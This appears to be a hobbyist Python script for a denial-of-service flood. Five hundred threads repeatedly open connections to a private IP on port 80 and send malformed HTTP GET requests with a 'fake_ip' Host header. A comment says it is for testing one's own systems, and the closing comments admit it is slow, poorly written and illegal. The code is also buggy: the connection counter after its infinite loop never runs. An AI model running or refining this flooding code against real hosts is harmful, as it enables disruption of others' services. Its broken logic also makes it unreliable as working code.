# To penetrate your own systems with to check it.

import threading 
import socket 

target = '10.0.0.138'
port = 80
fake_ip = '182.21.28.32'

already_connected = 0

def attack() :
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\
        
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

    global already_connected
    already_connected +=1
    if already_connected % 500 == 0:
        print(already_connected)

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()    

 # First Error encounted line 14 AF_INEt not init...
 # error 2 - TimeoutError: [WinError 10060] A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
 # First of it is not optimal not a good script
 # - its so i get the idea on how to do it
 # - its slow and its not heavy not sending data
 # - Its illegal also